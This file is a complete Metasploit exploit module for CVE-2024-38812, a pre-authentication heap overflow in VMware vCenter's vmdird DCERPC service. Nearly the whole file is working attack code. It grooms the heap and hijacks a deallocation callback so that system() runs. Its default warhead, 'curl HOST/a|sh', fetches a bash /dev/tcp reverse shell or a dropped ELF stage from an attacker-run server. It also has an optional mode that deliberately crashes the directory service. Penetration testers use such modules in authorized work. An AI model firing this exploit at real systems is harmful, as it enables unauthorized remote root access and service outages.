# -*- coding: binary -*-
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# Ruby port of vmware_torpedo.py - CVE-2024-38812 vCenter vmdird pre-auth RCE.
# The protocol builders and shot sequence are byte-for-byte identical to the
# validated PoC; only the warhead delivery layer was adapted for Metasploit.
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpServer

  # NDR transfer-syntax UUID 8a885d04-1ceb-11c9-9fe8-08002b104860 (little-endian wire form)
  NDR_SYNTAX = "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60".freeze
  # vmdird interface UUID 2acd53d0-fa52-4eb3-9299-7dd7514b25f4 (little-endian wire form)
  VMDIR_UUID = "\xd0\x53\xcd\x2a\x52\xfa\xb3\x4e\x92\x99\x7d\xd7\x51\x4b\x25\xf4".freeze

  VMDIR_VER   = [1, 4].freeze
  VMDIR_OPNUM = 1
  MAX_CMD     = 0x17 # warhead must fit before the callback slot at fragbuf+0x18
  WARHEAD_URI = '/a'.freeze # the proven file path piped into sh
  PAYLOAD_URI = '/B'.freeze # stage-two ELF for native (linux/x64) payloads

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'VMware vCenter vmdird DCERPC Pre-Auth Heap Overflow RCE',
      'Description' => %q{
        This module exploits a pre-authentication relative heap overflow in the
        vmdird DCERPC interface of VMware vCenter Server (TCP/2012), tracked as
        CVE-2024-38812.

        The chain:
          1. Groom - open GROOM connections and send a partially-delivered PDU
             declaring a 0x1000-byte fragment, so vmdird allocates and holds a
             0x1050-byte fragment buffer whose +0x18 slot carries its
             deallocation callback.
          2. Warm - issue WARM requests on the exploit connection so its NDR
             allocations land on the groomed arena.
          3. Fire - send the vulnerable operation with a build-constant
             displacement (LOWER) so the relative heap write overwrites a
             co-located fragment buffer's +0x18 callback with system@plt and
             stages the command at fragbuf+0x00 (the RDI argument).
          4. Detonate - close the groom connections; the freed buffer invokes
             the hijacked callback: system(command).

        The warhead is limited to 23 ASCII bytes with no NUL. By default this
        module fires `curl HOST/a|sh` and serves the payload script itself at
        /a - with the default cmd/unix/reverse_bash payload the served file is
        a plain bash reverse shell (/dev/tcp), so nothing is ever written to
        disk on the appliance. linux/x64 payloads are instead delivered
        through a stage-two ELF dropped from /var/tmp, /tmp or /run, which
        fails on appliances that mount those noexec.

        For a blind proof or a fixed effect, set CMD to a short single command
        (e.g. `id>/tmp/pwn`); output is not returned to the attacker.

        Build-constant defaults target VCSA 7.0 U3p (build 22837322): non-PIE
        system@plt 0x41aa80, LOWER=0x820 with GROOM=120 / WARM=12. The lwsmd
        supervisor auto-restarts a crashed vmdird into a fresh instance where
        the build-constant displacement is valid again; other builds need
        their own SYSTEM_PLT and LOWER values.

        For authorized testing only: misfires and CrashReset can crash the
        directory/SSO service.
      },
      'Author' => [
        'RHann1bl3L3ct3r' # original research, exploit and writeup
      ],
      'References' => [
        ['CVE', '2024-38812'],
        ['URL', 'https://github.com/Hann1bl3L3ct3r/VMwareTorpedo'] 
      ],
      'DisclosureDate' => '2024-06-25',
      'License' => MSF_LICENSE,
      'Platform' => 'linux',
      'Arch' => ARCH_X64,
      'Privileged' => true,
      'Targets' => [
        [
          'VCSA 7.0 U3p (build 22837322) - vmdird system@plt 0x41aa80',
          { 'Arch' => [ARCH_X64, ARCH_CMD], 'Platform' => ['linux', 'unix'] }
        ]
      ],
      'DefaultTarget' => 0,
      'DefaultOptions' => {
        'Payload' => 'cmd/unix/reverse_bash', # bash /dev/tcp revshell, piped straight into sh
        'SRVPORT' => 80, # keeps `curl HOST/a|sh` inside the 23-byte warhead limit
        # WfsDelay must outlast (crash-reset restart) + detonation + the
        # appliance's curl callback, or stop_service tears the stage server
        # down before /a is fetched. 15s was too tight; hold the passive
        # server open long enough for a late hit to still pull the stage.
        'WfsDelay' => 60
      },
      'Notes' => {
        'Stability' => [CRASH_SERVICE_DOWN],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      Opt::RPORT(2012),
      OptString.new('LOWER', [true, 'Build-constant NDR displacement/2 (write lands at fragbuf +LOWER*2)', '0x820']),
      OptString.new('SYSTEM_PLT', [true, 'Non-PIE system@plt of vmdird for the target build', '0x41aa80']),
      OptString.new('CMD', [false, 'Blind mode: run this command directly instead of the dropper (<= 23 ASCII bytes, no NUL)', nil]),
      OptInt.new('GROOM', [true, 'Partial-PDU groom connections (fragbuf spray)', 120]),
      OptInt.new('WARM', [true, 'Warm-up requests on the firing connection', 12]),
      OptInt.new('Attempts', [true, 'Paced salvos (~75% per shot; keep small to avoid self-degrade)', 3]),
      OptFloat.new('Delay', [true, 'Seconds between salvos', 1.5]),
      OptBool.new('CrashReset', [false, 'INTENTIONAL DoS (lab / explicit-ROE only): crash vmdird before each shot to clear displacement drift', false]),
      OptString.new('CRASH_LOWER', [false, 'Out-of-region displacement/2 used by CrashReset', '0x1000000']),
      OptInt.new('RestartTimeout', [true, 'Seconds to wait for the lwsmd auto-restart after CrashReset', 60])
    ])
  end

  # This module uses the HTTP server purely as a stage-delivery channel for an
  # otherwise ACTIVE, single-shot exploit. The TcpServer/SocketServer mixins
  # (pulled in by HttpServer) force a passive stance via
  # `update_info('Stance' => Passive)`, which makes MSF run the module as a
  # background job and never auto-interact with the session the callback
  # creates - the operator is left to `sessions -i` by hand, and a premature
  # "Exploit completed, but no session was created" is printed before the job
  # even fires. Force aggressive so a single `run` executes in the foreground,
  # the framework's post-exploit wait_for_session catches the reverse shell,
  # and the console drops straight into it.
  def stance
    Msf::Exploit::Stance::Aggressive
  end

  def check
    vprint_status("probing vmdird DCE/RPC at #{datastore['RHOST']}:#{datastore['RPORT']}")
    return CheckCode::Unknown('no connection / no BIND_ACK - vmdird not detected') unless service_up
    CheckCode::Detected('vmdird answered a DCE/RPC bind - verify build constants for this appliance')
  end

  def exploit
    lower = parse_int(datastore['LOWER'], 'LOWER')
    system_plt = parse_int(datastore['SYSTEM_PLT'], 'SYSTEM_PLT')
    crash_lower = parse_int(datastore['CRASH_LOWER'], 'CRASH_LOWER')

    dropper = dropper_mode?
    if dropper
      # Msf::Exploit::Remote::HttpServer mounts on_request_uri at a SINGLE
      # path - URIPATH if set, else a random URI - and Rex routes a request
      # only when its path starts with that mount. The warhead hardcodes /a
      # (and native payloads fetch /B), so mount on_request_uri at '/' to make
      # it the catch-all this code assumes; on_request_uri then dispatches /a,
      # /B and / internally. Without this, /a returns 404 and the piped `sh`
      # gets an error page instead of the stage - i.e. it fires but no shell.
      start_service('Path' => '/')
      @fname = Rex::Text.rand_text_alpha_lower(6)
      @payload_url = "http://#{warhead_host}#{port_suffix}#{PAYLOAD_URI}"
      warhead = build_warhead_command
      print_status("dropper mode: payload script served at http://#{warhead_host}#{port_suffix}#{WARHEAD_URI}")
    else
      warhead = datastore['CMD']
    end

    warhead = warhead.to_s.b
    if warhead.length > MAX_CMD || warhead.include?("\x00")
      fail_with(Failure::BadConfig, "warhead must be <= #{MAX_CMD} ASCII bytes with no NUL (got #{warhead.length} B)")
    end
    blob = build_payload(warhead, system_plt)

    print_status("LOCKED ON TARGET - vmdird #{datastore['RHOST']}:#{datastore['RPORT']}")
    print_status(format('firing solution: LOWER=0x%x (fragbuf +0x%x) | SYSTEM_PLT=0x%x | GROOM=%d WARM=%d',
                        lower, lower * 2, system_plt, datastore['GROOM'], datastore['WARM']))
    print_status("warhead (#{warhead.length} B): #{warhead.inspect}")
    print_warning('*** DEPTH CHARGES ARMED (CrashReset): each shot intentionally crashes vmdird first. ***') if datastore['CrashReset']

    attempts = datastore['Attempts'].to_i
    if datastore['CrashReset'] && attempts > 1
      print_warning('CrashReset set: forcing Attempts to 1 - the lwsmd autorestart throttle hard-stops vmdird after ~2 consecutive crashes, so only a single depth-charged shot is possible')
      attempts = 1
    end
    delivered = 0
    1.upto(attempts) do |n|
      if datastore['CrashReset']
        print_status("salvo #{n}/#{attempts}: depth-charge reset to a fresh instance first")
        unless crash_and_wait(crash_lower, datastore['RestartTimeout'])
          print_error('aborting: target did not resurface')
          break
        end
      end

      print_status("=== SALVO #{n}/#{attempts} - FIRE ===")
      if fire(lower, blob, datastore['GROOM'], datastore['WARM'])
        delivered += 1
        print_good("torpedo #{n} running hot, straight, and normal")
      else
        print_warning("salvo #{n} misfired in the tube")
      end

      sleep datastore['Delay'].to_f if n < attempts
    end

    if delivered.positive?
      print_good("SALVO COMPLETE - #{delivered}/#{attempts} torpedo(es) away (~75% per shot)")
      if dropper
        # Aggressive stance: fall off the end of exploit() now and let the
        # framework's post-exploit wait_for_session (bounded by WfsDelay) drop
        # us into the shell the instant the callback lands - no fixed sleep, so
        # no dead wait after the reverse shell has already connected. The stage
        # server is torn down by Msf::Exploit::Remote::HttpServer#cleanup, which
        # the framework runs AFTER that wait - so we must NOT stop_service here
        # or the appliance's `curl HOST/a` would hit a dead server.
        print_status("stage server live at http://#{warhead_host}#{port_suffix}#{WARHEAD_URI} - waiting up to #{datastore['WfsDelay']}s for the shell...")
      else
        print_status('blind execution - verify the effect out-of-band')
      end
    else
      print_error("ALL TUBES MISFIRED - 0/#{attempts} delivered. Target busy/unreachable or firing solution off (check LOWER / GROOM / SYSTEM_PLT).")
    end
    # No ensure/stop_service: the HttpServer mixin's #cleanup stops the service
    # after wait_for_session (and also on any exception, via the framework's
    # job_cleanup_proc), which is exactly when we want the stage server to die.
  end

  # ---------------------------------------------------------------------------
  # Warhead construction
  # ---------------------------------------------------------------------------

  def dropper_mode?
    datastore['CMD'].to_s.strip.empty?
  end

  def parse_int(value, name)
    Integer(value.to_s)
  rescue ArgumentError, TypeError
    fail_with(Failure::BadConfig, "#{name} must be decimal or 0x-prefixed hex (got #{value.inspect})")
  end

  def warhead_host
    host = datastore['SRVHOST'].to_s
    host = Rex::Socket.source_address(datastore['RHOST']) if host.empty? || host == '0.0.0.0' || host == '::'
    host = Rex::Socket.getaddress(host) unless Rex::Socket.is_ip?(host)
    host
  rescue StandardError
    host
  end

  def port_suffix
    datastore['SRVPORT'].to_i == 80 ? '' : ":#{datastore['SRVPORT']}"
  end

  def build_warhead_command
    cmd = "curl #{warhead_host}#{port_suffix}#{WARHEAD_URI}|sh"
    if cmd.length > MAX_CMD && WARHEAD_URI != '/'
      # bare root URL always fits any IPv4 host at SRVPORT 80
      cmd = "curl #{warhead_host}#{port_suffix}|sh"
      print_warning("warhead with #{WARHEAD_URI} exceeds #{MAX_CMD} B; falling back to bare root URL: #{cmd.inspect}")
    end
    if cmd.length > MAX_CMD
      fail_with(Failure::BadConfig,
                "warhead #{cmd.inspect} is #{cmd.length} B; limit #{MAX_CMD}. Set SRVPORT=80 or shorten SRVHOST, or use blind CMD mode.")
    end
    cmd
  end

  def cmd_payload?
    payload_instance.respond_to?(:arch) && payload_instance.arch.include?(ARCH_CMD)
  rescue StandardError
    false
  end

  def stage_one_script
    return payload.encoded if cmd_payload?

    <<~SH
      for d in /var/tmp /tmp /run
      do
        f="$d/.#{@fname}"
        if curl -so "$f" #{@payload_url} && chmod +x "$f"
        then exec "$f"
        fi
      done
    SH
  end

  def on_request_uri(cli, request)
    uri = request.uri.to_s
    if uri.start_with?(PAYLOAD_URI) && !cmd_payload?
      print_status("payload request from #{cli.peerhost} - sending #{payload.encoded.length} bytes of stage two")
      send_response(cli, payload.encoded, 'Content-Type' => 'application/octet-stream')
    elsif uri == WARHEAD_URI || uri == '/' || uri.empty?
      print_status("stage-one warhead callback from #{cli.peerhost} - serving #{cmd_payload? ? 'cmd payload' : 'dropper script'}")
      send_response(cli, stage_one_script, 'Content-Type' => 'text/plain')
    else
      vprint_status("ignoring #{uri} from #{cli.peerhost}")
      send_response(cli, '', 'Content-Type' => 'text/plain')
    end
  end

  # ---------------------------------------------------------------------------
  # Protocol builders (identical to the validated PoC)
  # ---------------------------------------------------------------------------

  def build_bind(cid = 1)
    body = [4280, 4280, 0].pack('vvV')
    body << [1, 0, 0].pack('CCv')
    body << [0, 1, 0].pack('vCC')
    body << VMDIR_UUID << [VMDIR_VER[0], VMDIR_VER[1]].pack('vv')
    body << NDR_SYNTAX << [2].pack('V')
    hdr = [5, 0, 0x0B, 0x03].pack('C4') << "\x10\x00\x00\x00"
    hdr << [16 + body.length, 0, cid].pack('vvV')
    hdr + body
  end

  def build_request(opnum, offset_a, data, cid = 2)
    stub = [0x20000, 256, offset_a, data.length / 2].pack('V4') << data
    stub << ("\x00" * ((4 - (stub.length % 4)) % 4))
    body = [stub.length, 0, opnum].pack('Vvv') << stub
    hdr = [5, 0, 0x00, 0x03].pack('C4') << "\x10\x00\x00\x00"
    hdr << [16 + body.length, 0, cid].pack('vvV')
    hdr + body
  end

  def build_partial(cid)
    hdr = [5, 0, 0x00, 0x03].pack('C4') << "\x10\x00\x00\x00"
    hdr << [0x1000, 0, cid].pack('vvV')
    hdr << [0x800, 0, VMDIR_OPNUM].pack('Vvv') << ("\x00" * 0x20)
  end

  def build_payload(command, system_plt)
    command.ljust(0x18, "\x00") + [system_plt].pack('Q<')
  end

  # ---------------------------------------------------------------------------
  # Shot plumbing
  # ---------------------------------------------------------------------------

  def open_conn(timeout = 6)
    connect(false, 'ConnectTimeout' => timeout)
  end

  def close_sock(sock)
    return if sock.nil?
    begin
      disconnect(sock)
    rescue StandardError
      begin
        sock.close
      rescue StandardError
        nil
      end
    end
  end

  def bind_ack?(pdu)
    pdu && pdu.length >= 3 && pdu.bytes[2] == 0x0C
  end

  def pdu_frag_len(buf)
    return 0 if buf.length < 10
    buf[8, 2].unpack1('v')
  rescue StandardError
    0
  end

  def recv_pdu(sock, timeout = 5.0)
    buf = String.new
    begin
      loop do
        chunk = sock.timed_read(4096, timeout)
        break if chunk.nil? || chunk.empty?
        buf << chunk
        flen = pdu_frag_len(buf)
        break if flen.positive? && buf.length >= flen
      end
    rescue StandardError
      # parity with the PoC: timeouts / resets simply end the read
    end
    buf
  end

  def service_up(timeout = 4)
    c = open_conn(timeout)
    c.put(build_bind(1))
    ack = bind_ack?(recv_pdu(c, timeout))
    close_sock(c)
    ack
  rescue StandardError
    false
  end

  def groom(groom_n, timeout = 6)
    conns = []
    (0...groom_n).each do |i|
      begin
        s = open_conn(timeout)
        s.put(build_bind(1))
        unless bind_ack?(recv_pdu(s, 5))
          close_sock(s)
          next
        end
        s.put(build_partial(2 + i))
        conns << s
      rescue StandardError
        next
      end
    end
    conns
  end

  def warm(sock, count)
    count.times do
      begin
        sock.put(build_request(VMDIR_OPNUM, 0, "\x42\x00" * 4, 2))
        recv_pdu(sock, 3)
      rescue StandardError
        return
      end
    end
  end

  # One torpedo: flood the tubes (groom) -> spin up gyros (warm) -> launch the
  # overflow at `lower` -> cut the wires (close groom, firing the hijacked
  # callback). Returns true if delivery succeeded (not a confirmed hit).
  def fire(lower, blob, groom_n, warm_n)
    print_status("  flooding the tubes - establishing #{groom_n} groom fragbuf connections...")
    conns = groom(groom_n)
    if conns.length < groom_n / 2
      conns.each { |s| close_sock(s) }
      print_warning("  tube flood incomplete (#{conns.length}/#{groom_n}) - target busy/unreachable, holding fire")
      return false
    end
    print_status("  tubes flooded (#{conns.length}/#{groom_n}) - spooling the firing connection")

    ex = nil
    begin
      ex = open_conn(8)
      ex.put(build_bind(1))
      unless bind_ack?(recv_pdu(ex, 5))
        print_warning('  firing connection failed to arm (no BIND_ACK) - misfire')
        return false
      end
      warm(ex, warm_n)
      print_status(format('  TORPEDOES AWAY - launching overflow at LOWER=0x%x', lower))
      ex.put(build_request(VMDIR_OPNUM, lower, blob, 3))
      recv_pdu(ex, 2)
      true
    rescue StandardError => e
      print_warning("  launch fault: #{e}")
      false
    ensure
      close_sock(ex)
      conns.each { |s| close_sock(s) } # frees the held fragbufs -> hijacked callback fires
      print_status('  wires cut - detonation window open')
    end
  end

  # Depth charge - INTENTIONAL DoS. Crashes a drifted vmdird so the lwsmd
  # supervisor restarts a FRESH instance in which the build-constant
  # displacement is valid again. Fires exactly once per salvo: the autorestart
  # throttle hard-stops the service after ~2 consecutive crashes.
  def crash_and_wait(crash_lower, restart_timeout)
    begin
      c = open_conn(6)
      c.put(build_bind(1))
      if bind_ack?(recv_pdu(c, 5))
        c.put(build_request(VMDIR_OPNUM, crash_lower, "\x00" * 8, 3))
        recv_pdu(c, 2)
      end
      close_sock(c)
    rescue StandardError
      nil
    end
    print_status(format('  depth charge away (LOWER=0x%x) - one shot only; watching for the auto-restart', crash_lower))
    start = Time.now
    saw_down = false
    while (Time.now - start) < restart_timeout
      up = service_up
      saw_down = true unless up
      if up && saw_down
        print_status('  target went dark and resurfaced - fresh instance serving')
        return true
      elsif up && (Time.now - start) > 8
        print_warning("  no fault observed in 8s - CRASH_LOWER=0x#{crash_lower.to_s(16)} likely in a mapped region (raise it); proceeding against current state")
        return true
      end
      sleep 0.3
    end
    print_error("  target went dark but did not resurface within #{restart_timeout}s - lwsmd autorestart throttle (needs a login `service-control --start vmdir`). ABORTING RUN.")
    false
  end
end
